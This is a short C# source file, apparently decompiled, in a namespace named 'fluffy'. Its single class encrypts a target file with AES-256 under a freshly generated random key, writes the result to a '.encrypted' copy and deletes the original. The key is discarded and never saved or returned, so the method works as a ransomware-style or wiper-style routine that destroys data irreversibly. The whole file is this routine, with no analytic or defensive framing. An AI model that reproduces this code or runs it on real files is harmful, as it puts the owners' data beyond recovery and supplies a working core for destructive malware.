using System;
using System.IO;
using System.Security.Cryptography;
using System.Threading.Tasks;

namespace fluffy;

internal static class Crypt
{
	public static async Task EncryptFileAsync(string _sourceFile, string _destFile = null)
	{
		if (_destFile == null)
		{
			_destFile = _sourceFile + ".encrypted";
		}
		using (AesManaged aes = new AesManaged
		{
			Mode = CipherMode.CBC,
			KeySize = 256
		})
		{
			aes.Padding = PaddingMode.PKCS7;
			aes.BlockSize = 128;
			aes.Key = GetRandomBytesCrypto(32);
			aes.GenerateIV();
			using FileStream writer = new FileStream(_destFile, FileMode.Create, FileAccess.Write);
			await writer.WriteAsync(aes.IV, 0, aes.IV.Length);
			using FileStream reader = new FileStream(_sourceFile, FileMode.Open, FileAccess.Read);
			using CryptoStream cs = new CryptoStream(writer, aes.CreateEncryptor(), CryptoStreamMode.Write);
			byte[] _buffer = new byte[1024000];
			int num;
			while ((num = await reader.ReadAsync(_buffer, 0, _buffer.Length)) > 0)
			{
				if (_buffer.Length > num)
				{
					Array.Resize(ref _buffer, num);
				}
				await cs.WriteAsync(_buffer, 0, _buffer.Length);
			}
		}
		await Task.Run(delegate
		{
			File.Delete(_sourceFile);
		});
	}

	private static byte[] GetRandomBytesCrypto(int length)
	{
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[length];
		rNGCryptoServiceProvider.GetBytes(array);
		return array;
	}
}
